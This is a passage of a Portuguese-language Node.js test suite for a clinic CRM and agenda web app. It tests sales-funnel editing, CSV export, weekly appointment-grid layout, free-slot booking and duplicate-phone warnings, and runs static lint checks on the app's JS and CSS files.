  assert.deepEqual(hints({ ...ok, estagios: [{ nome: "A", tipo: "aberto", probabilidade: 120, sla_horas: 0 }, ok.estagios[1], ok.estagios[2]] }), ["probabilidade", "sla"]);
  assert.equal(L.validarFunil({ nome: "x", estagios: [] })[0].hint, "etapas");
  assert.deepEqual(L.marcosDoTipo("perdido").map(m => m.id), ["nao_fechou", "perdida"]);
  assert.equal(L.probPadrao("ganho"), 100);
});

await teste("editor de funis: etapas removidas, destinos do mesmo tipo, payload e moverItem", () => {
  const orig = [{ id: "a", nome: "A", tipo: "aberto" }, { id: "b", nome: "B", tipo: "aberto" }, { id: "g", nome: "G", tipo: "ganho" }, { id: "p", nome: "P", tipo: "perdido" }];
  const edit = [orig[1], { nome: "Nova", tipo: "aberto" }, orig[2], orig[3]];
  assert.deepEqual(L.etapasRemovidas(orig, edit).map(e => e.id), ["a"]);
  assert.deepEqual(L.destinosPara(orig[0], edit).map(e => e.id), ["b"], "só etapas salvas (com id) do mesmo tipo");
  const p = L.payloadFunil({ id: "f1", nome: " Pós ", conta_no_ads: false }, [{ ...edit[0], marco: "nova", probabilidade: "40", sla_horas: "" }, edit[1], edit[2], edit[3]], { a: "b", x: null });
  assert.equal(p.nome, "Pós"); assert.equal(p.id, "f1");
  assert.deepEqual(p.estagios[0], { id: "b", nome: "B", tipo: "aberto", cor: null, marco: null, probabilidade: 40, sla_horas: null });
  assert.equal(p.estagios[1].id, undefined);
  assert.deepEqual(p.mover, { a: "b" });
  assert.equal(L.payloadFunil({ nome: "x", conta_no_ads: true }, [{ nome: "A", tipo: "aberto", marco: "nova" }]).estagios[0].marco, "nova");
  assert.deepEqual(L.moverItem([1, 2, 3, 4], 3, 0), [4, 1, 2, 3]);
  assert.deepEqual(L.moverItem([1, 2, 3], 0, 5), [1, 2, 3]);
});

await teste("editor de funis: remover a etapa que era DESTINO de outra repassa o destino (sem «?» nem estagio_invalido/destino)", () => {
  // A (com negócios) → B; depois B sai também, com destino C: A passa a ir para C
  const mover = { a: "b" };
  assert.deepEqual(L.quemVaiPara(mover, "b"), ["a"]);
  assert.deepEqual(L.repontarMover(mover, "b", "c", true), { a: "c", b: "c" });
  assert.deepEqual(L.repontarMover(mover, "b", "c", false), { a: "c" }, "B sem negócios próprios não entra no mover");
  assert.deepEqual(mover, { a: "b" }, "não altera o original");
  // o payload final só aponta para etapas que ficam
  const ficam = [{ id: "c", nome: "C", tipo: "aberto" }, { id: "g", nome: "G", tipo: "ganho" }, { id: "p", nome: "P", tipo: "perdido" }];
  const p = L.payloadFunil({ id: "f", nome: "F" }, ficam, L.repontarMover(mover, "b", "c", true));
  const ids = new Set(p.estagios.map(e => e.id));
  assert.ok(Object.values(p.mover).every(d => ids.has(d)));
});

await teste("textoErro dos hints de funil, etapa com negócios e campos", () => {
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "marcos" }), /Nova conversa.*Fechou/);
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "tem_fechados" }), /Desative/);
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "padrao_sem_ads" }), /funil padrão/);
  assert.match(L.textoErro({ codigo: "estagio_invalido", hint: "destino_tipo" }), /mesmo tipo/);
  assert.equal(L.textoErro({ codigo: "estagio_com_negocios", hint: "1" }), "Essa etapa tem 1 negócio. Escolha para onde ele vai.");
  assert.equal(L.textoErro({ codigo: "estagio_com_negocios", hint: "12" }), "Essa etapa tem 12 negócios. Escolha para onde eles vão.");
  assert.match(L.textoErro({ codigo: "dados_invalidos", hint: "max_campos" }), /50 campos/);
  assert.match(L.textoErro({ codigo: "empresa_nao_encontrada" }), /empresa/);
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "fechado_no_ads" }), /Iniciar pós-venda/, "trava do Ads continua igual");
});

await teste("exportar: linhas do CSV com colunas que a importação reconhece e campos personalizados", () => {
  const campos = [{ entidade: "contato", chave: "convenio", rotulo: "Convênio", tipo: "opcao", ordem: 2 },
    { entidade: "contato", chave: "retorno", rotulo: "Retorno em", tipo: "data", ordem: 1 },
    { entidade: "negocio", chave: "x", rotulo: "X" }];
  const { cabecalho, linhas } = L.linhasExportacao([
    { nome: "Ana", telefone: "5512998303030", email: "ana@x.com", empresa_nome: "Frota", cidade: "Taubaté", uf: "SP", nascimento: "1990-12-31",
      documento: "123", origem: "indicacao", etiquetas_nomes: ["VIP", "Implante"], dono_nome: "Beto", optin_marketing: false,
      criado_em: "2026-09-28T02:00:00Z", obs: "x", campos: { convenio: "Unimed", retorno: "2026-10-05" } }], campos);
  assert.deepEqual(cabecalho.slice(-2), ["Retorno em", "Convênio"]);
  assert.deepEqual(linhas[0], ["Ana", "(12) 99830-3030", "ana@x.com", "Frota", "Taubaté", "SP", "31/12/1990", "123", "Indicação", "VIP; Implante",
    "Beto", "Não", "27/09/2026", "x", "05/10/2026", "Unimed"]);
  // o cabeçalho volta certinho pela sugestão de mapeamento da importação
  assert.deepEqual(L.sugerirMapeamento(cabecalho.slice(0, 10)), ["nome", "telefone", "email", "empresa", "cidade", "uf", "nascimento", "documento", "origem", "etiquetas"]);
  assert.equal(L.dataCurtaCSV(null), "");
});

/* ============================================================ (a2) agenda (M26) */
console.log("\n(a2) agenda.js — grade de horário");
const AG = await import("../web/app/agenda.js");

await teste("agenda: semana de segunda a domingo, dia civil e instantes em São Paulo", () => {
  assert.equal(AG.diaISO("2026-10-31", 1), "2026-11-01");
  assert.equal(AG.diaISO("2026-03-01", -1), "2026-02-28");
  assert.equal(AG.diaDaSemana("2026-10-01"), 4);                 // quinta
  assert.equal(AG.segundaDe("2026-10-01"), "2026-09-28");        // quinta → segunda
  assert.equal(AG.segundaDe("2026-09-28"), "2026-09-28");        // segunda → ela mesma
  assert.equal(AG.segundaDe("2026-10-04"), "2026-09-28");        // domingo fecha a semana
  assert.deepEqual(AG.partesSP("2026-10-01T10:30:00-03:00"), { dia: "2026-10-01", min: 630 });
  assert.deepEqual(AG.partesSP("2026-10-01T02:30:00Z"), { dia: "2026-09-30", min: 23 * 60 + 30 });   // 02:30Z = 23:30 do dia anterior em SP
  assert.equal(AG.partesSP("não é data"), null);
  assert.equal(AG.horaTxt(630), "10:30");
});

await teste("agenda: horário de atendimento — faixas, intervalos, horário aberto e janelas fechadas", () => {
  const cfg = { horario: { 1: [["08:00", "18:00"]], 2: [["08:00", "18:00"]], 6: [["08:00", "12:00"]] }, intervalos: [["12:00", "13:00"]], duracao_min: 30 };
  const seg = "2026-09-28", dom = "2026-10-04", sab = "2026-10-03";
  assert.deepEqual(AG.faixasDoDia(cfg, seg), [[480, 1080]]);
  assert.deepEqual(AG.faixasDoDia(cfg, dom), []);                 // sem faixa = dia fechado
  assert.equal(AG.faixasDoDia({}, seg), null);                    // sem horário na configuração = não sabe (nada é sombreado)
  assert.equal(AG.horarioAberto(cfg, seg, 10 * 60), true);
  assert.equal(AG.horarioAberto(cfg, seg, 12 * 60 + 30), false);  // almoço
  assert.equal(AG.horarioAberto(cfg, seg, 7 * 60), false);
  assert.equal(AG.horarioAberto(cfg, dom, 10 * 60), false);
  assert.equal(AG.horarioAberto({}, seg, 10 * 60), null);
  const eixo = { ini: 7, fim: 19 };
  assert.deepEqual(AG.janelasFechadas(cfg, seg, eixo), [[420, 480], [720, 780], [1080, 1140]]);
  assert.deepEqual(AG.janelasFechadas(cfg, dom, eixo), [[420, 1140]]);
  assert.deepEqual(AG.janelasFechadas(cfg, sab, eixo), [[420, 480], [720, 1140]]);
  assert.deepEqual(AG.janelasFechadas({}, seg, eixo), []);
});

await teste("agenda: eixo de horas — expediente dos dias mostrados, esticado para caber toda consulta (mínimo 4 h)", () => {
  const cfg = { horario: { 1: [["08:00", "18:00"]], 2: [["08:00", "18:00"]], 6: [["08:00", "12:00"]] }, duracao_min: 30 };
  const dias = ["2026-09-28", "2026-09-29"];
  assert.deepEqual(AG.eixoDaGrade({}), { ini: 8, fim: 18 });                                         // sem nada: 08–18
  assert.deepEqual(AG.eixoDaGrade({ dias, config: cfg }), { ini: 8, fim: 18 });
  assert.deepEqual(AG.eixoDaGrade({ dias: ["2026-10-03"], config: cfg }), { ini: 8, fim: 12 });
  const cedo = { inicio: "2026-09-28T07:30:00-03:00", fim: "2026-09-28T08:15:00-03:00" };
  const tarde = { inicio: "2026-09-29T18:30:00-03:00", fim: "2026-09-29T19:15:00-03:00" };
  assert.deepEqual(AG.eixoDaGrade({ dias, config: cfg, consultas: [cedo, tarde] }), { ini: 7, fim: 20 });
  const outroDia = { inicio: "2026-10-09T06:00:00-03:00", fim: "2026-10-09T07:00:00-03:00" };
  assert.deepEqual(AG.eixoDaGrade({ dias, config: cfg, consultas: [outroDia] }), { ini: 8, fim: 18 });   // consulta de outro dia não estica o eixo
  assert.deepEqual(AG.eixoDaGrade({ dias: ["2026-09-28"], config: { horario: { 1: [["09:00", "10:00"]] } } }), { ini: 9, fim: 13 });
  assert.deepEqual(AG.eixoDaGrade({ dias: ["2026-10-04"], config: cfg }), { ini: 8, fim: 18 });          // semana toda fechada: volta a 08–18
});

await teste("agenda: posição do bloco — a altura é a duração (60 min = o dobro de 30 min)", () => {
  const eixo = { ini: 8, fim: 18 };
  const um = AG.posicaoNoDia({ inicio: "2026-09-28T10:00:00-03:00", fim: "2026-09-28T10:30:00-03:00" }, "2026-09-28", eixo);
  const dois = AG.posicaoNoDia({ inicio: "2026-09-28T11:00:00-03:00", fim: "2026-09-28T12:00:00-03:00" }, "2026-09-28", eixo);
  assert.deepEqual(um, { topo: 2, altura: 0.5 });
  assert.deepEqual(dois, { topo: 3, altura: 1 });
  assert.equal(dois.altura, 2 * um.altura);
  // sem `fim`: duração padrão; fim antes do início: duração padrão
  assert.deepEqual(AG.posicaoNoDia({ inicio: "2026-09-28T09:00:00-03:00" }, "2026-09-28", eixo, 45), { topo: 1, altura: 0.75 });
  assert.deepEqual(AG.posicaoNoDia({ inicio: "2026-09-28T09:00:00-03:00", fim: "2026-09-28T08:00:00-03:00" }, "2026-09-28", eixo, 30), { topo: 1, altura: 0.5 });
  // começa antes do eixo: corta no topo; fora do eixo: null
  assert.deepEqual(AG.posicaoNoDia({ inicio: "2026-09-28T07:00:00-03:00", fim: "2026-09-28T09:00:00-03:00" }, "2026-09-28", eixo), { topo: 0, altura: 1 });
  assert.equal(AG.posicaoNoDia({ inicio: "2026-09-28T19:00:00-03:00", fim: "2026-09-28T20:00:00-03:00" }, "2026-09-28", eixo), null);
  // bloqueio de dia inteiro (00:00 → 00:00 do dia seguinte) ocupa o eixo todo
  assert.deepEqual(AG.posicaoNoDia({ inicio: "2026-10-04T00:00:00-03:00", fim: "2026-10-05T00:00:00-03:00" }, "2026-10-04", eixo), { topo: 0, altura: 10 });
});

await teste("agenda: consultas no mesmo horário ficam LADO A LADO (colunas dentro da faixa)", () => {
  const b = (topo, altura, nome) => ({ topo, altura, nome });
  // duas no mesmo horário
  const duas = AG.colocarEmFaixas([b(1, 0.5, "A"), b(1, 0.5, "B")]);
  assert.deepEqual(duas.map(x => [x.nome, x.col, x.cols]), [["A", 0, 2], ["B", 1, 2]]);
  // em sequência: cada uma ocupa a largura toda
  assert.deepEqual(AG.colocarEmFaixas([b(1, 0.5, "A"), b(1.5, 0.5, "B"), b(3, 1, "C")]).map(x => [x.col, x.cols]), [[0, 1], [0, 1], [0, 1]]);
  // três ao mesmo tempo
  assert.deepEqual(AG.colocarEmFaixas([b(2, 1, "A"), b(2, 1, "B"), b(2, 1, "C")]).map(x => [x.col, x.cols]), [[0, 3], [1, 3], [2, 3]]);
  // cadeia: A 9–10, B 9:30–10:30, C 10–11 → A e C dividem a mesma faixa (A termina quando C começa), B a outra; ordem de entrada preservada
  const cad = AG.colocarEmFaixas([b(1, 1, "A"), b(1.5, 1, "B"), b(2, 1, "C")]);
  assert.deepEqual(cad.map(x => [x.nome, x.col, x.cols]), [["A", 0, 2], ["B", 1, 2], ["C", 0, 2]]);
  // grupos independentes não se afetam: o 1º tem 2 colunas, o 2º só 1
  const g = AG.colocarEmFaixas([b(1, 1, "A"), b(1, 1, "B"), b(5, 1, "C")]);
  assert.deepEqual(g.map(x => x.cols), [2, 2, 1]);
  // um bloco que contém outro
  assert.deepEqual(AG.colocarEmFaixas([b(1, 3, "grande"), b(2, 0.5, "pequeno")]).map(x => [x.col, x.cols]), [[0, 2], [1, 2]]);
  assert.deepEqual(AG.colocarEmFaixas([]), []);
});

await teste("agenda: cor do procedimento (sempre a mesma), consultas e bloqueios do dia, hora do clique", () => {
  const c = AG.corDoProcedimento("Limpeza");
  assert.ok(Number.isInteger(c) && c >= 0 && c <= 11);
  assert.equal(AG.corDoProcedimento("  LIMPEZA "), c);
  assert.equal(AG.corDoProcedimento("Limpeza"), c);
  assert.equal(AG.corDoProcedimento("Avaliação"), AG.corDoProcedimento("avaliacao"));
  assert.equal(AG.corDoProcedimento(""), 3);
  assert.equal(AG.corDoProcedimento(null), 3);
  const todas = new Set(["Limpeza", "Clareamento", "Implante", "Ortodontia", "Avaliação", "Canal", "Faceta", "Lente", "Extração", "Revisão"].map(AG.corDoProcedimento));
  assert.ok(todas.size >= 6, "as cores se espalham pela paleta");
  const consultas = [{ inicio: "2026-09-28T14:00:00-03:00", n: 2 }, { inicio: "2026-09-28T09:00:00-03:00", n: 1 }, { inicio: "2026-09-29T09:00:00-03:00", n: 3 }, { n: 4 }];
  assert.deepEqual(AG.consultasDoDia(consultas, "2026-09-28").map(x => x.n), [1, 2]);
  const bloqueios = [{ id: 1, inicio: "2026-10-04T00:00:00-03:00", fim: "2026-10-05T00:00:00-03:00" }, { id: 2, inicio: "2026-10-02T12:00:00-03:00", fim: "2026-10-02T13:00:00-03:00" }];
  assert.deepEqual(AG.bloqueiosDoDia(bloqueios, "2026-10-04").map(x => x.id), [1]);
  assert.deepEqual(AG.bloqueiosDoDia(bloqueios, "2026-10-05"), [], "o bloqueio que termina à meia-noite não vaza para o dia seguinte");
  assert.deepEqual(AG.bloqueiosDoDia(bloqueios, "2026-10-02").map(x => x.id), [2]);
  const eixo = { ini: 8, fim: 18 };
  assert.equal(AG.horaDoClique(0.5, eixo, 30), "13:00");
  assert.equal(AG.horaDoClique(0.32, eixo, 30), "11:00");        // 11:12 → arredonda PARA BAIXO ao passo
  assert.equal(AG.horaDoClique(0, eixo, 30), "08:00");
  assert.equal(AG.horaDoClique(1, eixo, 30), "17:30");           // a borda de baixo não vira 18:00
  assert.equal(AG.horaDoClique(0.5, eixo, 60), "13:00");
  assert.equal(AG.horaDoClique(0.54, eixo, 15), "13:15");   // 13:24 → 13:15
  assert.equal(AG.horaDoClique(0.55, eixo, 15), "13:30");
});

await teste("agenda (M27): horários livres por dia, rótulos «Hoje/Amanhã/Sex 03/10», primeiro livre, amanhã de manhã e o mais perto do clique", () => {
  const sl = (iso, livre = true) => ({ inicio: iso, livre, ocupados: livre ? 0 : 1, capacidade: 1 });
  const horarios = [
    sl("2026-10-01T14:30:00.000Z"),            // 11:30 de quinta (hoje)
    sl("2026-10-01T16:00:00.000Z", false),     // ocupado: fora
    sl("2026-10-02T11:30:00.000Z"),            // 08:30 de sexta (amanhã)
    sl("2026-10-02T12:00:00.000Z"),            // 09:00 de sexta
    sl("2026-10-02T19:30:00.000Z"),            // 16:30 de sexta
    sl("2026-10-03T12:00:00.000Z"),            // 09:00 de sábado
    { inicio: "lixo", livre: true },
    null,
  ];
  const g = AG.agruparLivres(horarios);
  assert.deepEqual(g.map(x => [x.dia, x.itens.length]), [["2026-10-01", 1], ["2026-10-02", 3], ["2026-10-03", 1]], "só os livres, agrupados por dia de São Paulo");
  assert.deepEqual(g[1].itens.map(s => s.min), [510, 540, 990], "em ordem de horário");
  assert.deepEqual(AG.agruparLivres([]), []);
  assert.deepEqual(AG.agruparLivres(null), []);
  // rótulos
  assert.equal(AG.rotuloDoDia("2026-10-01", "2026-10-01"), "Hoje");
  assert.equal(AG.rotuloDoDia("2026-10-02", "2026-10-01"), "Amanhã");
  assert.equal(AG.rotuloDoDia("2026-10-03", "2026-10-01"), "Sáb 03/10");
  assert.equal(AG.rotuloDoDia("2026-10-05", "2026-10-01"), "Seg 05/10");
  assert.equal(AG.rotuloDoDia("2026-11-01", "2026-10-31"), "Amanhã", "virada de mês");
  // atalhos
  assert.equal(AG.primeiroLivre(g).inicio, "2026-10-01T14:30:00.000Z");
  assert.equal(AG.primeiroLivre([]), null);
  assert.equal(AG.amanhaDeManha(g, "2026-10-01").inicio, "2026-10-02T11:30:00.000Z", "amanhã antes do meio-dia");
  const tarde = AG.agruparLivres([sl("2026-10-02T19:30:00.000Z")]);
  assert.equal(AG.amanhaDeManha(tarde, "2026-10-01"), null, "amanhã só tem tarde → sem atalho");
  assert.equal(AG.amanhaDeManha(g, "2026-10-02").inicio, "2026-10-03T12:00:00.000Z", "o «amanhã» acompanha o «hoje» informado");
  // o horário livre mais perto do clique, no mesmo dia
  assert.equal(AG.slotMaisPerto(g, "2026-10-02", "09:10").min, 540);
  assert.equal(AG.slotMaisPerto(g, "2026-10-02", "15:00").min, 990);
  assert.equal(AG.slotMaisPerto(g, "2026-10-02", "08:00").min, 510);
  assert.equal(AG.slotMaisPerto(g, "2026-10-09", "09:00"), null, "dia sem horário livre");
  assert.equal(AG.slotMaisPerto(g, "2026-10-02", "xx"), null);
});

await teste("marcar consulta (M27): 2 toques, busca ao digitar, atalhos, desfazer — estático de agenda.js e do botão na gaveta", () => {
  const js = ler("agenda.js"), neg = ler("crm-negocio.js"), css = ler("agenda.css");
  assert.ok(/export async function marcarConsulta\(ctx,/.test(js) && /export async function desmarcarConsulta\(ctx,/.test(js), "as janelas são exportadas (o CRM abre a mesma pela gaveta)");
  assert.ok(/ui\.debounce\(buscarAgora, 300\)/.test(js) && !/Buscar negócios/.test(js), "a busca roda enquanto digita; sem o botão «Buscar negócios»");
  assert.ok(/api\.rpcC\("nx_buscar", \{ p_q: q \}\)/.test(js), "busca por uma chamada só (nx_buscar)");
  assert.ok(/api\.rpcC\("nx_agenda_livres"/.test(js) && /carregarHorarios\(\{ inicial: true \}\)/.test(js), "escolher a oportunidade já carrega os horários livres");
  assert.ok(/Primeiro livre/.test(js) && /Amanhã de manhã/.test(js), "atalhos");
  assert.ok(/role: "radio"/.test(js) && /radiosComSetas/.test(js), "chips e pílulas como radios, com setas");
  assert.ok(/\[data-tipo="primario"\]/.test(js) && /\.focus\(/.test(js), "com a oportunidade escolhida o foco vai para «Confirmar consulta» (Enter = 2º toque)");
  assert.ok(/ui\.acaoComDesfazer\(/.test(js) && /nx_agenda_desmarcar/.test(js) && /anterior/.test(js), "aviso «Marcada para … · Desfazer» (desmarca, ou volta ao horário anterior)");
  assert.ok(/ui\.carregarCss\("agenda"\)/.test(js.slice(js.indexOf("export async function marcarConsulta"))), "o CSS da agenda carrega também quando a janela abre pelo CRM");
  assert.ok(/ctx\.comandos\.registrar\(\{ id: "agenda\.marcar"/.test(js), "ação «Marcar consulta» registrada na paleta (M18)");
  assert.ok(/class: "bt bt-sec ng-marcar"/.test(neg) && /marcarConsulta\(k\.ctx/.test(neg), "gaveta do negócio: botão «Marcar consulta»");
  assert.ok(/\.ag-hora-pill\[aria-checked="true"\]/.test(css) && /\.ag-dia-chip\[aria-checked="true"\]/.test(css), "estilo do selecionado");
});

await teste("cadastro (M24): aviso de duplicado pelo telefone digitado e a origem do cartão em uma linha", () => {
  const itens = [{ id: 501, telefone: "5512998303030", nome: "Mariana Costa", ultimo_contato_em: "2026-09-29T12:00:00Z" }, { id: 502, telefone: "5512981112222", nome: "Rafael" }, { id: 503, telefone: null, nome: "Sem telefone" }];
  // a mesma pessoa em qualquer formato (máscara, +55, sem o 9º dígito, só dígitos)
  for (const dig of ["(12) 99830-3030", "12998303030", "+55 12 99830-3030", "5512998303030", "1298303030", "(12) 9830-3030"]) assert.equal(L.acharDuplicado(itens, dig).id, 501, dig);
  // só vale com 10–13 dígitos; outra pessoa, a própria (edição) ou lista vazia não avisam
  assert.equal(L.acharDuplicado(itens, "(12) 99830-30"), null, "ainda incompleto");
  assert.equal(L.acharDuplicado(itens, "12998303031"), null, "outro número");
  assert.equal(L.acharDuplicado(itens, "12998303030", { ignorarId: 501 }), null, "o próprio cadastro não é duplicado dele mesmo");
  assert.equal(L.acharDuplicado([], "12998303030"), null);
  assert.equal(L.acharDuplicado(null, "12998303030"), null);
  assert.equal(L.acharDuplicado(itens, "55129983030301234"), null, "mais de 13 dígitos");
  // origem do cartão (tooltip do glifo)
  assert.equal(L.descricaoOrigem({ plataforma: "google", campanha_nome: "Aparelho invisível", anuncio_nome: "Vídeo 1", origem: "anuncio" }), "Google Ads · Campanha Aparelho invisível · Anúncio Vídeo 1");
  assert.equal(L.descricaoOrigem({ plataforma: "meta" }), "Meta Ads");
  assert.equal(L.descricaoOrigem({ origem: "whatsapp" }), "WhatsApp");
  assert.equal(L.descricaoOrigem({ origem: "indicacao", rastreio: { utm_campaign: "x" } }), "Indicação · Campanha x");
  assert.equal(L.descricaoOrigem({}), "");
  assert.equal(L.descricaoOrigem(null), "");
});

await teste("cartão e gaveta (M24): 3 linhas, nenhum tamanho abaixo de 12 px, glifo da origem, pontos de etiqueta, campos em blocos e aviso de duplicado — estático", () => {
  const k = ler("crm-kanban.js"), css = ler("crm.css"), neg = ler("crm-negocio.js"), listas = ler("crm-listas.js");
  assert.ok(/class: "kc-l2"/.test(k) && /class: "kc-rod"/.test(k) && /class: "kc-pontos"/.test(k) && /L\.descricaoOrigem\(c\)/.test(k), "cartão: título, valor + contato/procedimento, rodapé");
  assert.ok(!/kc-selos|kc-etiqs/.test(k) && !/kc-selos|kc-etiqs/.test(css), "as pílulas e etiquetas por extenso saíram do cartão");
  assert.ok(/simbolo\(c\.plataforma === "google" \? "google" : "meta", "anuncio"\)/.test(k), "glifo i-meta/i-google (megafone se o símbolo ainda não existe)");
  assert.ok(/etqs\.slice\(0, 3\)/.test(k), "até 3 pontos de etiqueta");
  // nenhum font-size literal abaixo de 12 px nas regras do cartão (--fs-11 = 11 px e px soltos < 12)
  const cartao = css.split("\n").filter(l => /^\.kc(-[a-z-]+)?\b/.test(l.trim()));
  for (const l of cartao) { assert.ok(!/--fs-11\b/.test(l), "11 px no cartão: " + l.slice(0, 60)); const m = l.match(/font-size:\s*(\d+(?:\.\d+)?)px/); assert.ok(!m || Number(m[1]) >= 12, "tamanho < 12 px: " + l.slice(0, 60)); }
  assert.ok(/\.kc-t \{[^}]*font-size: var\(--fs-15\)/.test(css) && /\.kc-valor \{[^}]*font-family: var\(--f-titulo\)[^}]*font-size: var\(--fs-h3\)/.test(css), "título 15 px / valor em Clash 16 px");
  // gaveta: campos em blocos (2 colunas no celular) e título com lápis
  assert.ok(/class: \["ng-campo", largo && "ng-campo-largo"\]/.test(neg) && /\.ng-campo-largo \{ grid-column: 1 \/ -1; \}/.test(css), "campos em blocos .ng-campo (largo ocupa a linha toda)");
  assert.ok(/@media \(max-width: 760px\) \{[\s\S]*?\.ng-kv \{ display: grid; grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/.test(css), "Dados em grade de 2 colunas no celular");
  assert.ok(/ng-lapis/.test(neg) && /Editar o título/.test(neg), "título editável pelo lápis");
  // duplicado e validação ao digitar
  assert.ok(/export function avisoDuplicado\(/.test(neg) && /L\.acharDuplicado\(/.test(neg) && /nx_contatos_listar/.test(neg), "aviso de duplicado (nx_contatos_listar)");
  assert.ok(/avisoDuplicado\(k, grade\.querySelector\("\[name=c_telefone\]"\)/.test(neg) && /N\.avisoDuplicado\(k, form\.querySelector\("\[name=telefone\]"\)/.test(listas), "Nova oportunidade e Novo paciente");
  assert.ok(!/Se o telefone já estiver cadastrado, usamos o mesmo cadastro/.test(neg), "a frase fixa saiu");
  assert.ok(/validar: "telefone"/.test(neg) && /validar: "moeda"/.test(neg) && /validar: "telefone"/.test(listas), "telefone e valor com ui.campo({validar})");
});

/* ============================================================ (b) estáticos */
console.log("\n(b) estáticos dos arquivos do CRM");
const ARQS_JS = ["crm.js", "crm-kanban.js", "crm-listas.js", "crm-negocio.js", "crm-tarefas.js", "crm-importar.js", "crm-config.js", "crm-logica.js", "agenda.js", "agenda-config.js"];
const existentes = ARQS_JS.filter(f => existsSync(join(APP, f)));

await teste("arquivos do CRM existem e passam em node --check", () => {
  for (const f of ARQS_JS) assert.ok(existsSync(join(APP, f)), `falta web/app/${f}`);
  assert.ok(existsSync(join(APP, "crm.css")), "falta web/app/crm.css");
  for (const f of existentes) execFileSync(process.execPath, ["--check", join(APP, f)]);
});

await teste("nenhum import estático; todo import() com ?v=", () => {
  for (const f of existentes) {
    const s = ler(f);
    assert.ok(!/^\s*import\s[^(]/m.test(s), `${f}: import estático`);
    for (const m of s.matchAll(/import\(([^)]*)\)/g)) {
      assert.ok(/\?v=/.test(m[1]) || /versao/.test(m[1]), `${f}: import() sem ?v=: ${m[1]}`);
      assert.ok(!/(ui|api|app|tema)\.js/.test(m[1]), `${f}: não pode carregar ui/api/app/tema`);
    }
  }
});

await teste("sem innerHTML/outerHTML/insertAdjacentHTML e sem on*= inline", () => {
  for (const f of existentes) {
    const s = ler(f);
    assert.ok(!/\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write/.test(s), `${f}: HTML cru`);
    assert.ok(!/["']on[a-z]+=/.test(s), `${f}: handler inline`);
  }
});

await teste("nenhum hex de cor nos JS do CRM", () => {
  for (const f of existentes) {
    const s = ler(f).replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
    assert.ok(!/#[0-9a-fA-F]{6}\b|#[0-9a-fA-F]{3}\b(?![\w-])/.test(s.replace(/["'`]#\/[^"'`]*["'`]/g, "")), `${f}: hex de cor no JS`);
  }
});

await teste("crm.css: só tokens (nenhum hex/rgb fixo), [hidden] forte, sem 1fr solto, sem ease-in", () => {
  const css = ler("crm.css");
  const semRoot = css.replace(/:root\s*\{[^}]*\}/g, "");
  assert.ok(!/#[0-9a-fA-F]{3,8}\b/.test(semRoot), "hex fora de :root");
  assert.ok(!/\brgba?\(/.test(semRoot), "rgb/rgba fixo");
  assert.ok(/\[hidden\]\s*\{\s*display:\s*none\s*!important/.test(css), "[hidden]{display:none!important}");
  assert.ok(!/(^|[\s(,])1fr/.test(css.replace(/minmax\(0,\s*1fr\)/g, "")), "1fr solto (use minmax(0,1fr))");
  assert.ok(!/ease-in(?!-out)/.test(css), "ease-in");
  assert.ok(/prefers-reduced-motion/.test(css) || !/animation:/.test(css), "reduced-motion");
});

await teste("kanban no toque (M23): touchmove não passivo, sem snap ao arrastar, touch-action nos dois eixos, «Mover para…» sempre à mão", () => {
  const js = ler("crm-kanban.js"), css = ler("crm.css");
  assert.ok(/addEventListener\("touchmove",\s*aoToqueMover,\s*\{\s*passive:\s*false\s*\}\)/.test(js), "touchmove não passivo (cancelar a rolagem só com o cartão levantado)");
  assert.ok(/ev\.cancelable/.test(js), "só cancela touchmove cancelável");
  assert.ok(/\.kb\.arrastando\s*\{[^}]*scroll-snap-type:\s*none/.test(css), "snap desligado durante o arrasto (a rolagem de borda é por scrollLeft)");
  assert.ok(/\.kc \{[\s\S]*?touch-action:\s*pan-x pan-y/.test(css), ".kc rola nos dois eixos (nunca touch-action: none)");
  assert.ok(!/\.kc[^{]*\{[^}]*touch-action:\s*none/.test(css), "touch-action: none em cartão roubaria a rolagem");
  assert.ok(/\.vista > \.crm\s*\{\s*animation-fill-mode:\s*backwards/.test(css), "sem transform residual no .crm (prenderia o position: fixed do botão flutuante)");
  assert.ok(/L\.gestoMover\(/.test(js) && /L\.gestoSoltar\(/.test(js) && /L\.TOQUE\.MS_LONGO/.test(js), "o arrasto por toque segue a máquina de estados do crm-logica");
  assert.ok(/abrirMoverPara/.test(js) && /class:\s*"bt-icone kc-mover"/.test(js) && /ev\.key === "m"/.test(js), "«Mover para…»: botão no cartão, tecla M e toque longo sem arrastar");
  assert.ok(/class:\s*"kb-fita"/.test(js) && /class:\s*"crm-fab"/.test(js) && /crm-resumo/.test(js), "fita de etapas, totais numa linha e botão flutuante");
  assert.ok(/\.kb-zonas\s*\{[^}]*animation-name:\s*zonasEntramM/.test(css), "zonas Ganhou/Perdeu valem no celular");
  assert.ok(!/\.kb-zonas\s*\{\s*display:\s*none/.test(css), "zonas não somem mais no celular");
});

await teste("agenda.css (M26): só tokens, paleta --pal-*, hachura do bloqueio, altura da hora pela tela, celular sem Dia/Semana", () => {
  const css = ler("agenda.css");
  assert.ok(!/#[0-9a-fA-F]{3,8}\b/.test(css.replace(/:root\s*\{[^}]*\}/g, "")), "hex fora de :root");
  assert.ok(!/\brgba?\(/.test(css), "rgb/rgba fixo");
  assert.ok(!/(^|[\s(,])1fr/.test(css.replace(/minmax\(0,\s*1fr\)/g, "")), "1fr solto (use minmax(0,1fr))");
  assert.ok(!/ease-in(?!-out)/.test(css), "ease-in");
  assert.ok(/--h-hora:\s*clamp\(/.test(css), "a altura da hora acompanha a tela");
  assert.ok(/repeating-linear-gradient\(135deg/.test(css), "bloqueio hachurado");
  assert.ok(/\.ag-item\s*\{[\s\S]*?height:\s*calc\(var\(--d\) \* var\(--h-hora\)\)/.test(css), "altura do bloco = duração × altura da hora");
  assert.ok(/--pal-\$\{cor\}/.test(ler("agenda.js")), "cor do bloco pelo token da paleta");
  assert.ok(!/\.agenda-dia\b|agenda-consulta\b/.test(css), "os cartões de dia antigos saíram");
  assert.ok(/\.agenda-abas \{ display: none; \}/.test(css), "celular: sem Dia/Semana (a visão é o dia com a faixa da semana)");
});

/* ============================================================ (a3) listas do celular (M28) */
console.log("\n(a3) listas do celular — Ligar/Conversa, deslizar e botão");

